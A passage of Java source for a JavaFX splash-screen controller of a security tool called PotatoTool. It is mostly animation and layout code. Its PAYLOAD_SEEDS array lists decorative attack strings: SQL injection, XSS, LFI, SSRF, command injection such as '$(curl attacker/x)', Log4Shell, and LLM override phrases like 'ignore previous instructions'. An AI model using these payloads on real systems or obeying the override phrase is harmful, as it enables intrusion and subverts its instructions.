package com.potato.potatotool.controller.publicPane;

import com.potato.potatotool.utils.core.I18nUtils;
import javafx.animation.Animation;
import javafx.animation.AnimationTimer;
import javafx.animation.FadeTransition;
import javafx.animation.Interpolator;
import javafx.animation.KeyFrame;
import javafx.animation.KeyValue;
import javafx.animation.ParallelTransition;
import javafx.animation.PauseTransition;
import javafx.animation.RotateTransition;
import javafx.animation.ScaleTransition;
import javafx.animation.SequentialTransition;
import javafx.animation.Timeline;
import javafx.animation.TranslateTransition;
import javafx.application.Platform;
import javafx.beans.property.BooleanProperty;
import javafx.beans.property.SimpleBooleanProperty;
import javafx.fxml.FXML;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.control.Label;
import javafx.scene.effect.ColorAdjust;
import javafx.scene.effect.DropShadow;
import javafx.scene.effect.GaussianBlur;
import javafx.scene.image.ImageView;
import javafx.scene.paint.Color;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Pane;
import javafx.scene.layout.Region;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.shape.Rectangle;
import javafx.scene.text.Text;
import javafx.util.Duration;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class PaneLoad {

    @FXML private StackPane root;
    @FXML private Region voidLayer;
    @FXML private Pane ambientLayer;
    @FXML private Pane coordinateLayer;
    @FXML private Pane binaryLayer;
    @FXML private Pane dualChannelLayer;
    @FXML private Pane dustLayer;
    @FXML private Pane connectionLayer;
    @FXML private Pane globalScanLayer;
    @FXML private HBox topRail;
    @FXML private Label topInstanceLabel;
    @FXML private Label topPhaseLabel;
    @FXML private Label topSessionLabel;
    @FXML private Label topTimeLabel;
    @FXML private Region topRailPulse;
    @FXML private HBox commandRow;
    @FXML private VBox leftWing;
    @FXML private Label moduleTitleLabel;
    @FXML private VBox moduleList;
    @FXML private StackPane glassDeck;
    @FXML private Region glassBack;
    @FXML private StackPane glassSurfaceLayer;
    @FXML private Region glassMist;
    @FXML private Pane glassTextureLayer;
    @FXML private Pane glassProbeLayer;
    @FXML private Region glassSpectrum;
    @FXML private Region glassHighlight;
    @FXML private Region glassTopEdge;
    @FXML private Region glassBottomEdge;
    @FXML private Region glassLeftEdge;
    @FXML private Region glassRightEdge;
    @FXML private VBox coreStack;
    @FXML private StackPane logoArea;
    @FXML private Region logoLens;
    @FXML private Region logoReticleOuter;
    @FXML private Region logoReticleInner;
    @FXML private ImageView logoImage;
    @FXML private Region logoScanLine;
    @FXML private StackPane titleStack;
    @FXML private Label titleShadowLabel;
    @FXML private HBox titleMainBox;
    @FXML private Label titlePotatoLabel;
    @FXML private Label titleToolLabel;
    @FXML private Region titleLockLine;
    @FXML private Label statusPrimaryLabel;
    @FXML private Label statusSecondaryLabel;
    @FXML private VBox rightWing;
    @FXML private Label telemetryTitleLabel;             // 重用作 matrixBlock title（文本改为 MATRIX）
    @FXML private Pane telemetryMatrix;
    @FXML private VBox telemetryList;

    // sub-block 容器引用（供样式和布局调试定位使用）
    @FXML private VBox moduleBlock;
    @FXML private VBox spectrumBlock;
    @FXML private VBox matrixBlock;
    @FXML private VBox valueBlock;
    @FXML private VBox radarBlock;

    // sub-block 右上状态 tag
    @FXML private Label moduleStateLabel;
    @FXML private Label spectrumTitleLabel;
    @FXML private Label spectrumStateLabel;
    @FXML private Label matrixStateLabel;
    @FXML private Label telemetryListTitleLabel;
    @FXML private Label valueStateLabel;
    @FXML private Label radarTitleLabel;
    @FXML private Label radarStateLabel;

    // 频谱柱状图 SPEC ANALYZER
    @FXML private Pane spectrumPane;
    @FXML private HBox spectrumScale;
    private final List<Region> spectrumBars = new ArrayList<Region>();
    private static final double SPECTRUM_BAR_MAX = 72;

    // 雷达 PPI PERIMETER
    @FXML private StackPane radarPane;
    @FXML private Label radarAzimKey;
    @FXML private Label radarAzimValue;
    @FXML private Label radarRngKey;
    @FXML private Label radarRngValue;
    private Pane radarArmGroup;                           // 雷达扫描臂容器，绕 PPI 圆心旋转
    private Region radarArm;                              // 雷达扫描臂本体
    private final List<Region> radarTargets = new ArrayList<Region>();
    @FXML private VBox bottomRail;
    @FXML private HBox phaseTrack;
    @FXML private StackPane energyRail;
    @FXML private Region energyFill;
    @FXML private Region energyShine;
    @FXML private Region terminalDot;
    @FXML private Region terminalRipple1;       // 终端心跳涟漪环 1
    @FXML private Region terminalRipple2;       // 终端心跳涟漪环 2，与 1 错峰 700ms
    @FXML private Label terminalPrimaryLabel;
    @FXML private Label terminalSecondaryLabel;
    @FXML private Region readyFlash;
    @FXML private Region cutLayer;
    @FXML private Pane cornerReticleLayer;          // 方案2 · HUD 拐角十字瓞准星宿主层

    private final BooleanProperty overLoading = new SimpleBooleanProperty(false);
    /**
     * 启动页完成信号。MainApplication 当前只在 loadedProperty=true 后展示主舞台，
     * 避免正常启动时主窗口在启动动画尾段提前抢焦点；该属性保留给旧监听和调试代码兼容。
     */
    private final BooleanProperty mainStageShowSignal = new SimpleBooleanProperty(false);
    private final List<Animation> animations = new ArrayList<Animation>();
    private final List<Dust> dusts = new ArrayList<Dust>();
    private final List<BinaryFlow> binaryFlows = new ArrayList<BinaryFlow>();
    private final List<Pane> dualChannels = new ArrayList<Pane>();
    private final List<ModuleRow> moduleRows = new ArrayList<ModuleRow>();
    private final List<Region> matrixCells = new ArrayList<Region>();
    private final List<Pane> globalScanBands = new ArrayList<Pane>();
    private final List<Label> telemetryValueLabels = new ArrayList<Label>();
    private final List<PhaseItem> phaseItems = new ArrayList<PhaseItem>();
    private final Random random = new Random();
    private Timeline globalScanTimeline;

    private AnimationTimer dustTimer;
    private AnimationTimer clockTimer;
    private AnimationTimer perfLogTimer;
    private Rectangle logoClip;

    // ambientLayer 三个色温 orb，用于 phase 切换时调整相对亮度
    private Region ambientCyan;
    private Region ambientViolet;
    private Region ambientAmber;

    // 启动动画模式：full=完整 5s 仪式 / minimal=极简 ~2.2s（只保留品牌核心） / off 由 MainApplication 跳过
    private String bootMode = "full";
    private static final double MINIMAL_TOTAL_MS = 2200;

    // 帧率监测 + 性能降级
    private int perfLevel = 0;                              // 0=normal / 1=L1 / 2=L2 / 3=L3
    private final long[] perfFrameTimes = new long[30];     // 滚动 30 帧时间戳
    private int perfFrameIdx = 0;
    private boolean perfFrameBufFull = false;
    private AnimationTimer perfMonitor;
    private boolean phaseGlassSweepEnabled = true;          // L3 触发时置 false 跳过玻璃高光
    /**
     * 是否开启自动性能降级主开关。
     *   true  = 启动 AnimationTimer 监测帧率，低于阈值时自动触发分级降级
     *   false = 彻底关闭性能监测和降级，动画保持高保真、全效果完整播放（不启动检测线程）
     */
    private static final boolean AUTO_DEGRADATION_ENABLED = false;
    /**
     * L3 级降级触发时（仅在开启自动降级主开关时生效），是否提前结束动画切入主界面。
     *   true  = 帧率极低时直接触发 overLoading 属性切场。
     *   false = 不再提前切场，仅做视觉降级（关闭高光扫掠），确保启动动画能够完整播放。
     * 默认 false，因为后台任务高负载加载是暂时的，让动画完整展现体验更好。
     */
    private static final boolean DEGRADE_SHORTCUT_ENABLED = false;

    // 矩阵 burst 防抖：纯随机 + 间隔需 > 850ms
    private long lastMatrixBurstMs = 0;

    private static final double WIDTH = 1280;
    private static final double HEIGHT = 720;
    private static final double TOTAL_MS = 5000;
    private static final double ENERGY_WIDTH = 440;
    private static final boolean LOAD_PERF_LOG_ENABLED = Boolean.getBoolean("potatotool.loadPerfLog");
    private static final long LOAD_PERF_SLOW_FRAME_MS = 34;
    private static final DateTimeFormatter CLOCK_FORMAT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String[] BINARY_SEEDS = {
            "0101", "1010", "1100", "0011", "TRACE", "PACKET", "HASH", "ROUTE", "SCAN", "VERIFY",
            "BUFFER", "SOCKET", "TOKEN", "HEADER", "COOKIE", "SESSION", "NONCE", "CIPHER",
            "FRAME", "STREAM", "CHUNK", "GZIP", "UTF-8", "SHA256", "AES-GCM", "X509", "RTT", "MTU"
    };
    private static final String[] SECURITY_SEEDS = {
            "YARA:MATCH", "IOC:HASH", "MITRE:T1059", "CVE:SCAN", "WAF:BLOCK", "EDR:HOOK",
            "TLS:FINGERPRINT", "SIG:VERIFY", "RULE:ACTIVE", "SANDBOX:TRACE", "DNS:CANARY",
            "DECODE:BASE64", "VULN:PROBE", "PATCH:CHECK", "HONEYPOT:LOG", "SIEM:EVENT",
            "ML:ANOMALY 0.97", "UEBA:OUTLIER", "ATT&CK:T1190", "ZEEK:DNS-TUNNEL",
            "SOAR:AUTOPLAY", "ZTNA:POSTURE", "EBPF:KPROBE", "SBOM:CYCLONEDX",
            "SIGSTORE:COSIGN", "TPM:PCR-QUOTE", "FIDO2:WEBAUTHN", "HSM:KEYWRAP",
            "DLP:SCAN", "CASB:ALERT", "XDR:CORRELATE", "CTI:STIX2",
            "DECEPTION:BAIT", "JA3:FP", "JA4:HASH", "OTEL:TRACE"
    };
    private static final String[] PAYLOAD_SEEDS = {
            "SQLI: ' OR '1'='1--", "SQLI: UNION SELECT NULL,NULL", "SQLI: admin'--",
            "SQLI: sleep(5)--", "SQLI: ' OR SLEEP(5)#",
            "XSS: <script>alert(1)</script>", "XSS: \"><svg/onload=alert(1)>",
            "XSS: javascript:alert(1)", "XSS: <img src=x onerror=alert(1)>",
            "LFI: ../../../../etc/passwd", "LFI: ../WEB-INF/web.xml",
            "LFI: ../../windows/win.ini", "LFI: php://filter/convert.base64-encode",
            "SSTI: {{7*7}}", "SSTI: ${7*7}", "SSTI: <%= 7*7 %>", "SSTI: {{config.items()}}",
            "XXE: <!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
            "XXE: <!ENTITY % oob SYSTEM \"http://attacker/x\">",
            "SSRF: http://127.0.0.1:8080/admin", "SSRF: gopher://127.0.0.1:6379/_PING",
            "SSRF: http://169.254.169.254/latest/meta-data/",
            "SSRF: dict://127.0.0.1:11211/stats",
            "RCE: cmd=whoami", "CMDI: ;id", "CMDI: | whoami", "CMDI: && uname -a",
            "CMDI: $(curl attacker/x)",
            "JNDI: ${jndi:ldap://127.0.0.1/a}", "JNDI: ${${lower:j}ndi:ldap://x/}",
            "LOG4SHELL: ${jndi:dns://${hostName}.x}",
            "UPLOAD: shell.jsp", "UPLOAD: .htaccess override",
            "DESERIAL: ac ed 00 05", "DESERIAL: rO0AB pickle b64",
            "FASTJSON: @type probe", "FASTJSON: rmi://x/Exploit",
            "LDAP: *)(uid=*))(|(uid=*",
            "NOSQL: {\"$ne\":null}", "NOSQL: {\"$where\":\"sleep(5000)\"}",
            "PATH: /proc/self/environ", "JWT: alg=none", "JWT: kid=../../../etc/passwd",
            "REDIS: CONFIG GET dir", "OGNL: %{7*7}", "EL: ${param.x}",
            "LLM: ignore previous instructions",
            "LLM: <|im_start|>system leak",
            "PROMPT: \\u202e bidi attack",
            "RAG: vector store poisoning",
            "GPT: jailbreak DAN mode",
            "K8S: kubectl auth can-i '*'",
            "AWS: IMDSv1 169.254.169.254",
            "GCP: metadata.google.internal",
            "DOCKER: /var/run/docker.sock",
            "RUNC: CVE-2019-5736 escape",
            "ETCD: 2379 unauth get /",
            "NPM: event-stream backdoor",
            "DEPCONF: @org/internal hijack",
            "PYPI: typosquat reqests",
            "GRAPHQL: __schema introspect",
            "PROTOTYPE: __proto__.isAdmin=1",
            "REQSMUGGLE: TE.CL diff",
            "KERNEL: CVE-2024-1086 nft",
            "ROP: pop rdi; ret",
            "SPECTRE: v1 bounds bypass",
            "REENTRANCY: call.value()()",
            "FLASHLOAN: aave drain",
            "MEV: sandwich attack",
            "ADB: tcpip 5555 unauth",
            "MQTT: sub # broker leak",
            "BLE: GATT enum",
            "PQ: kyber768 keygen",
            "PQ: dilithium sign",
            "QUANTUM: shor n=2048",
            "SPRING4SHELL: class.module.classLoader",
            "S2-045: %{(#_='multipart/form-data')",
            "MODELSTEAL: query extraction",
            "ADVERSARIAL: epsilon=8/255"
    };

    private String[] moduleNames;
    private String[] telemetryNames;
    private String[] phaseNames;
    private String[] primaryStatus;
    private String[] secondaryStatus;
    private String[] topPhases;

    public BooleanProperty loadedProperty() {
        return overLoading;
    }

    /**
     * 启动页完成信号。MainApplication 当前只在 loadedProperty=true 后展示主舞台，
     * 避免正常启动时主窗口在启动动画尾段提前抢焦点；该属性保留给旧监听和调试代码兼容。
     */
    public BooleanProperty mainStageShowSignalProperty() {
        return mainStageShowSignal;
    }

    private void markLoadingComplete() {
        if (!mainStageShowSignal.get()) mainStageShowSignal.set(true);
        if (!overLoading.get()) overLoading.set(true);
    }

    /**
     * 启动动画完成后进入主界面加载等待态。
     * 停掉重负载动画，但保留低成本 READY 呼吸，避免等待期间像卡死。
     */
    public void enterMainLoadHold() {
        stopRuntimeAnimations(false, false);
        startReadyHoldMotion();
    }

    public void forceCompleteForStartupFallback() {
        markLoadingComplete();
    }

    private void startReadyHoldMotion() {
        if (terminalDot != null) {
            terminalDot.setOpacity(1.0);
            Timeline dotPulse = new Timeline(
                    new KeyFrame(Duration.ZERO,
                            new KeyValue(terminalDot.scaleXProperty(), 1.0),
                            new KeyValue(terminalDot.scaleYProperty(), 1.0),
                            new KeyValue(terminalDot.opacityProperty(), 1.0)),
                    new KeyFrame(Duration.millis(720),
                            new KeyValue(terminalDot.scaleXProperty(), 1.42, Interpolator.EASE_BOTH),
                            new KeyValue(terminalDot.scaleYProperty(), 1.42, Interpolator.EASE_BOTH),
                            new KeyValue(terminalDot.opacityProperty(), 0.58, Interpolator.EASE_BOTH)),
                    new KeyFrame(Duration.millis(1440),
                            new KeyValue(terminalDot.scaleXProperty(), 1.0, Interpolator.EASE_BOTH),
                            new KeyValue(terminalDot.scaleYProperty(), 1.0, Interpolator.EASE_BOTH),
                            new KeyValue(terminalDot.opacityProperty(), 1.0, Interpolator.EASE_BOTH))
            );
            dotPulse.setCycleCount(Animation.INDEFINITE);
            dotPulse.play();
            animations.add(dotPulse);
        }
        if (statusSecondaryLabel != null) {
            statusSecondaryLabel.setText("FINALIZING WORKBENCH");
            Timeline labelPulse = new Timeline(
                    new KeyFrame(Duration.ZERO, new KeyValue(statusSecondaryLabel.opacityProperty(), 1.0)),
                    new KeyFrame(Duration.millis(900), new KeyValue(statusSecondaryLabel.opacityProperty(), 0.62, Interpolator.EASE_BOTH)),
                    new KeyFrame(Duration.millis(1800), new KeyValue(statusSecondaryLabel.opacityProperty(), 1.0, Interpolator.EASE_BOTH))
            );
            labelPulse.setCycleCount(Animation.INDEFINITE);
            labelPulse.play();
            animations.add(labelPulse);
        }
        if (terminalSecondaryLabel != null) {
            Timeline dots = new Timeline(
                    new KeyFrame(Duration.ZERO, e -> terminalSecondaryLabel.setText("FINALIZING WORKBENCH")),
                    new KeyFrame(Duration.millis(420), e -> terminalSecondaryLabel.setText("FINALIZING WORKBENCH.")),
                    new KeyFrame(Duration.millis(840), e -> terminalSecondaryLabel.setText("FINALIZING WORKBENCH..")),
                    new KeyFrame(Duration.millis(1260), e -> terminalSecondaryLabel.setText("FINALIZING WORKBENCH..."))
            );
            dots.setCycleCount(Animation.INDEFINITE);
            dots.play();
            animations.add(dots);
        }
        if (energyRail != null && energyShine != null) {
            energyRail.setOpacity(1.0);
            energyShine.setTranslateX(-78);
            energyShine.setOpacity(0);
            Timeline sweep = new Timeline(
                    new KeyFrame(Duration.ZERO,
                            new KeyValue(energyShine.translateXProperty(), -78.0),
                            new KeyValue(energyShine.opacityProperty(), 0.0)),
                    new KeyFrame(Duration.millis(160),
                            new KeyValue(energyShine.opacityProperty(), 0.86, Interpolator.EASE_OUT)),
                    new KeyFrame(Duration.millis(940),
                            new KeyValue(energyShine.translateXProperty(), ENERGY_WIDTH, Interpolator.LINEAR),
                            new KeyValue(energyShine.opacityProperty(), 0.64, Interpolator.LINEAR)),
                    new KeyFrame(Duration.millis(1180),
                            new KeyValue(energyShine.opacityProperty(), 0.0, Interpolator.EASE_IN)),
                    new KeyFrame(Duration.millis(1720),
                            new KeyValue(energyShine.opacityProperty(), 0.0))
            );
            sweep.setCycleCount(Animation.INDEFINITE);
            sweep.play();
            animations.add(sweep);
        }
    }

    /**
     * 设置启动动画模式，由 MainApplication 调用。
     * 支持值：
     *   "full"    完整 5s 仪式（默认）
     *   "minimal" 极简 ~2.2s，跳过 HUD/GLASS 子动画，只保留 ambient + glass + logo + title + ready
     *   "off"     不支持（直接跳过 loadMainStage）
     */
    public void setBootMode(String mode) {
        if ("minimal".equals(mode) || "full".equals(mode)) {
            this.bootMode = mode;
        }
    }

    /**
     * 性能监测，滚动平均判定降级等级。
     * 阈值：
     *   > 22ms (~45fps) -> L1：binary 减少、停 binary 漂移
     *   > 33ms (~30fps) -> L2：dust hide、matrix 静止、dropshadow 减半
     *   > 50ms (~20fps) -> L3：跳过 phaseGlass 高光、提前结束序列
     */
    private void startPerfMonitor() {
        if (perfMonitor != null) return;
        perfMonitor = new AnimationTimer() {
            @Override public void handle(long nowNanos) {
                long nowMs = nowNanos / 1_000_000L;
                int prevIdx = perfFrameIdx;
                perfFrameTimes[perfFrameIdx] = nowMs;
                perfFrameIdx = (perfFrameIdx + 1) % perfFrameTimes.length;
                if (perfFrameIdx == 0) perfFrameBufFull = true;
                // 每 10 帧抽样一次，避免每帧跑判定开销
                if (perfFrameBufFull && prevIdx % 10 == 0) {
                    long oldest = perfFrameTimes[perfFrameIdx]; // 即将被覆盖的最早帧
                    long newest = perfFrameTimes[prevIdx];
                    long avgMs = (newest - oldest) / 29;
                    if (avgMs > 50 && perfLevel < 3) {
                        perfLevel = 3;
                        applyDegradationLevel3();
                    } else if (avgMs > 33 && perfLevel < 2) {
                        perfLevel = 2;
                        applyDegradationLevel2();
                    } else if (avgMs > 22 && perfLevel < 1) {
                        perfLevel = 1;
                        applyDegradationLevel1();
                    }
                }
            }
        };
        perfMonitor.start();
    }

    /**
     * L1 降级：隐藏部分 binary 节点，降低渲染开销。
     */
    private void applyDegradationLevel1() {
        int keep = Math.min(32, binaryFlows.size());
        for (int i = keep; i < binaryFlows.size(); i++) {
            javafx.scene.text.Text node = binaryFlows.get(i).node;
            if (node != null) {
                node.setVisible(false);
                node.setOpacity(0);
            }
        }
    }

    /**
     * L2 降级：dust 全部 hide + matrix 静止 + glassBack dropshadow 减半。
     */
    private void applyDegradationLevel2() {
        if (dustLayer != null) dustLayer.setVisible(false);
        if (dustTimer != null) dustTimer.stop();
        for (Region cell : matrixCells) {
            cell.setOpacity(0.18);
            cell.getStyleClass().remove("matrix-cell-hot");
        }
        try {
            DropShadow halfShadow = new DropShadow();
            halfShadow.setRadius(29);          // 58 / 2
            halfShadow.setSpread(0.18);
            halfShadow.setOffsetY(12);         // 24 / 2
            halfShadow.setColor(Color.color(0, 0, 0, 0.72));
            glassBack.setEffect(halfShadow);
        } catch (Exception ignored) {}
    }

    /**
     * L3 降级：跳过 phaseGlass 高光 sweep，并根据配置决定是否提前结束序列。
     */
    private void applyDegradationLevel3() {
        phaseGlassSweepEnabled = false;
        if (!DEGRADE_SHORTCUT_ENABLED) return;
        Platform.runLater(new Runnable() {
            @Override public void run() {
                markLoadingComplete();
            }
        });
    }

    public void initialize() {
        normalizeStyleClasses(root);
        initText();
        buildAmbient();
        buildCoordinates();
        buildBinaryTelemetry();
        buildDualChannels();
        buildConnections();
        buildGlobalScanner();
        buildDust();
        buildGlassTexture();
        buildGlassProbe();
        buildModules();
        buildTelemetry();
        buildSpectrum();                              // 频谱柱状图 SPEC ANALYZER
        buildRadar();                                 // 雷达 PPI PERIMETER
        buildPhaseTrack();
        buildCornerReticles();                       // 方案2 · 拐角准星需在 layout 上屏后才能拾取 bounds，内部用 Platform.runLater 延后定位
        prepareInitialState();
        startClock();
        startPerfLogIfEnabled();
        startTerminalRipple();                       // 启动心跳涟漪（bottomRail 未 fade-in 前不可见，不影响首屏）
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                runSequence();
            }
        });
    }

    private void normalizeStyleClasses(Node node) {
        if (node == null) return;
        boolean changed = false;
        List<String> normalized = new ArrayList<String>();
        for (String styleClass : node.getStyleClass()) {
            if (styleClass == null) continue;
            String trimmed = styleClass.trim();
            if (trimmed.length() == 0) continue;
            if (trimmed.indexOf(' ') >= 0 || trimmed.indexOf('\t') >= 0 || trimmed.indexOf('\n') >= 0) {
                String[] parts = trimmed.split("\\s+");
                for (String part : parts) {
                    if (part.length() > 0) normalized.add(part);
                }
                changed = true;
            } else {
                normalized.add(trimmed);
            }
        }
        if (changed) {
            node.getStyleClass().setAll(normalized);
        }
        if (node instanceof Parent) {
            for (Node child : ((Parent) node).getChildrenUnmodifiable()) {
                normalizeStyleClasses(child);
            }
        }
    }

    private void initText() {
        topInstanceLabel.setText(safeI18n("load0524.top.instance", "POTATOTOOL / LOCAL INSTANCE"));
        topSessionLabel.setText(safeI18n("load0524.top.session", "SESSION // LOCAL"));
        moduleTitleLabel.setText(safeI18n("load0524.wing.module", "MODULE CHECK"));
        telemetryTitleLabel.setText(safeI18n("load0524.wing.matrix", "RULE HITMAP"));
        if (spectrumTitleLabel != null) spectrumTitleLabel.setText(safeI18n("load0524.wing.spectrum", "FINGERPRINT MAP"));
        if (telemetryListTitleLabel != null) telemetryListTitleLabel.setText(safeI18n("load0524.wing.telemetry", "TELEMETRY"));
        if (radarTitleLabel != null) radarTitleLabel.setText(safeI18n("load0524.wing.radar", "SURFACE MAP"));
        if (radarAzimKey != null) radarAzimKey.setText(safeI18n("load0524.radar.azim", "AZIM"));
        if (radarRngKey != null) radarRngKey.setText(safeI18n("load0524.radar.rng", "RNG"));
        // tag 统一使用英文符号（NASA 类控制台风格），不参与 i18n、在中英文需求下一致
        if (moduleStateLabel != null) moduleStateLabel.setText("[CHECK]");
        if (spectrumStateLabel != null) spectrumStateLabel.setText("[LIVE]");
        if (matrixStateLabel != null) matrixStateLabel.setText("[SCAN]");
        if (valueStateLabel != null) valueStateLabel.setText("[LIVE]");
        if (radarStateLabel != null) radarStateLabel.setText("[ACTIVE]");
        moduleNames = new String[] {
                safeI18n("load0524.module.core", "KERNEL"),
                safeI18n("load0524.module.ui", "CONSOLE"),
                safeI18n("load0524.module.i18n", "LOCALE"),
                safeI18n("load0524.module.network", "VECTOR-NET"),
                safeI18n("load0524.module.engine", "POC-FORGE"),
                safeI18n("load0524.module.storage", "IOC-VAULT")
        };
        telemetryNames = new String[] {
                safeI18n("load0524.telemetry.signal", "SIGNAL"),
                safeI18n("load0524.telemetry.latency", "LATENCY"),
                safeI18n("load0524.telemetry.cache", "RULES"),
                safeI18n("load0524.telemetry.memory", "VECTORS")
        };
        phaseNames = new String[] {
                safeI18n("load0524.phase.boot", "BOOT"),
                safeI18n("load0524.phase.auth", "KEYS"),
                safeI18n("load0524.phase.load", "RULES"),
                safeI18n("load0524.phase.sync", "VECTORS"),
                safeI18n("load0524.phase.ready", "READY")
        };
        primaryStatus = new String[] {
                safeI18n("load0524.status.dark", "正在唤醒本地安全运行环境"),
                safeI18n("load0524.status.hud", "正在校验规则索引与密钥状态"),
                safeI18n("load0524.status.glass", "正在装载指纹库与攻击面向量"),
                safeI18n("load0524.status.logo", "正在确认 PotatoTool 控制台身份"),
                safeI18n("load0524.status.ready", "安全工作台已就绪")
        };
        secondaryStatus = new String[] {
                safeI18n("load0524.secondary.dark", "LOCAL SECURITY RUNTIME WAKEUP"),
                safeI18n("load0524.secondary.hud", "RULE INDEX AND KEYSPACE CHECK"),
                safeI18n("load0524.secondary.glass", "FINGERPRINT AND VECTOR BANK LOAD"),
                safeI18n("load0524.secondary.logo", "CONSOLE IDENTITY CONFIRMED"),
                safeI18n("load0524.secondary.ready", "SECURITY WORKBENCH READY")
        };
        topPhases = new String[] {
                safeI18n("load0524.top.phase.bootstrap", "BOOTSTRAP"),
                safeI18n("load0524.top.phase.calibrate", "KEYSPACE"),
                safeI18n("load0524.top.phase.materialize", "RULE INDEX"),
                safeI18n("load0524.top.phase.identify", "IDENTIFY"),
                safeI18n("load0524.top.phase.ready", "READY")
        };
        statusPrimaryLabel.setText(primaryStatus[0]);
        statusSecondaryLabel.setText(secondaryStatus[0]);
        terminalPrimaryLabel.setText(primaryStatus[0]);
        terminalSecondaryLabel.setText(secondaryStatus[0]);
        topPhaseLabel.setText(topPhases[0]);
    }

    private void prepareInitialState() {
        ambientLayer.setOpacity(0);
        coordinateLayer.setOpacity(0);
        binaryLayer.setOpacity(0);
        dualChannelLayer.setOpacity(0);
        dustLayer.setOpacity(0);
        connectionLayer.setOpacity(0);
        globalScanLayer.setOpacity(0);
        topRail.setOpacity(0);
        topRail.setTranslateY(-14);
        commandRow.setOpacity(1);
        leftWing.setOpacity(0);
        leftWing.setTranslateX(-26);
        rightWing.setOpacity(0);
        rightWing.setTranslateX(26);
        bottomRail.setOpacity(0);
        bottomRail.setTranslateY(18);

        glassDeck.setOpacity(0);
        glassDeck.setScaleX(0.88);
        glassDeck.setScaleY(0.88);
        glassBack.setOpacity(0);
        glassMist.setOpacity(0);
        glassSpectrum.setOpacity(0);
        glassTextureLayer.setOpacity(0);
        if (glassProbeLayer != null) glassProbeLayer.setOpacity(0);
        glassHighlight.setOpacity(0);
        glassHighlight.setRotate(-18);
        glassHighlight.setTranslateX(-390);
        glassHighlight.setCache(true);
        glassHighlight.setCacheHint(javafx.scene.CacheHint.SPEED);
        Rectangle surfaceClip = new Rectangle(520, 430);
        surfaceClip.setArcWidth(52);
        surfaceClip.setArcHeight(52);
        glassSurfaceLayer.setClip(surfaceClip);

        glassTopEdge.setTranslateY(-214);
        glassBottomEdge.setTranslateY(214);
        glassLeftEdge.setTranslateX(-260);
        glassRightEdge.setTranslateX(260);
        glassTopEdge.setScaleX(0);
        glassBottomEdge.setScaleX(0);
        glassLeftEdge.setScaleY(0);
        glassRightEdge.setScaleY(0);
        glassTopEdge.setOpacity(0);
        glassBottomEdge.setOpacity(0);
        glassLeftEdge.setOpacity(0);
        glassRightEdge.setOpacity(0);

        logoArea.setOpacity(0);
        logoLens.setScaleX(0.72);
        logoLens.setScaleY(0.72);
        logoReticleOuter.setScaleX(0.78);
        logoReticleOuter.setScaleY(0.78);
        logoReticleInner.setScaleX(0.72);
        logoReticleInner.setScaleY(0.72);
        logoImage.setOpacity(0);
        logoImage.setEffect(createLogoToneAdjust());
        logoClip = new Rectangle(126, 0);
        logoImage.setClip(logoClip);
        logoScanLine.setOpacity(0);
        logoScanLine.setTranslateY(-84);
        logoScanLine.setCache(true);
        logoScanLine.setCacheHint(javafx.scene.CacheHint.SPEED);

        titleShadowLabel.setOpacity(0);
        titleShadowLabel.setTranslateX(-8);
        titleShadowLabel.setTranslateY(6);
        titleMainBox.setOpacity(0);
        titleMainBox.setTranslateY(18);
        titlePotatoLabel.setOpacity(1.0);
        titleToolLabel.setOpacity(1.0);
        setRegionWidth(titleLockLine, 0);
        titleLockLine.setOpacity(0);

        energyRail.setOpacity(0);
        setRegionWidth(energyFill, 0);
        energyShine.setOpacity(0);
        energyShine.setTranslateX(-78);

        statusPrimaryLabel.setOpacity(0);
        statusSecondaryLabel.setOpacity(0);
        readyFlash.setOpacity(0);
        cutLayer.setOpacity(0);

        // [A3 首屏感知速度] voidLayer 起始略压暗，给 phasePrewake 0~100ms 的醒来动画空间
        voidLayer.setOpacity(0.85);
        voidLayer.setScaleX(0.998);
        voidLayer.setScaleY(0.998);

        // [方案2] HUD 拐角允许默认全屏隐藏，由 phaseHud 统一渐显
        if (cornerReticleLayer != null) cornerReticleLayer.setOpacity(0);
    }

    private void buildAmbient() {
        ambientCyan = orb(720, "ambient-cyan", -230, -170, 54);
        ambientViolet = orb(620, "ambient-violet", 850, 130, 60);
        ambientAmber = orb(440, "ambient-amber", 85, 520, 52);
        // [A1 色彩讲故事] 初始 opacity = WAKE 阶段色温（极冷冷启动），phase 切换时会渐变调整
        ambientCyan.setOpacity(0.65);
        ambientViolet.setOpacity(0.35);
        ambientAmber.setOpacity(0.10);
        ambientLayer.getChildren().addAll(ambientCyan, ambientViolet, ambientAmber);
        drift(ambientCyan, 40, 26, 9.5);
        drift(ambientViolet, -36, 32, 11.0);
        drift(ambientAmber, 28, -22, 10.2);
    }

    /**
     * [A1 色彩讲故事] 调整 ambient 三个 orb 的相对透明度，渲染当前 phase 的色温意图。
     * 每个 phase 调用一次，FadeTransition 让色温平滑切换。
     */
    private void tintAmbient(double cyanOp, double violetOp, double amberOp, double durationMs) {
        if (ambientCyan == null) return;
        fadeTo(ambientCyan, durationMs, cyanOp);
        fadeTo(ambientViolet, durationMs, violetOp);
        fadeTo(ambientAmber, durationMs, amberOp);
    }

    private Region orb(double size, String styleClass, double x, double y, double blur) {
        Region r = new Region();
        r.getStyleClass().addAll("ambient-orb", styleClass);
        r.setMinSize(size, size);
        r.setPrefSize(size, size);
        r.setMaxSize(size, size);
        r.setLayoutX(x);
        r.setLayoutY(y);
        r.setEffect(new GaussianBlur(blur));
        r.setCache(true);
        r.setCacheHint(javafx.scene.CacheHint.SPEED);
        return r;
    }

    private void drift(Node node, double dx, double dy, double seconds) {
        TranslateTransition t = new TranslateTransition(Duration.seconds(seconds), node);
        t.setFromX(0);
        t.setFromY(0);
        t.setToX(dx);
        t.setToY(dy);
        t.setAutoReverse(true);
        t.setCycleCount(Animation.INDEFINITE);
        t.setInterpolator(Interpolator.EASE_BOTH);
        t.play();
        animations.add(t);
    }

    private void buildCoordinates() {
        double[] xs = {160, 320, 480, 640, 800, 960, 1120};
        for (int i = 0; i < xs.length; i++) {
            Region line = line(1, HEIGHT, xs[i], 0, i == 3);
            line.setScaleY(0);
            coordinateLayer.getChildren().add(line);
        }
        double[] ys = {120, 240, 360, 480, 600};
        for (int i = 0; i < ys.length; i++) {
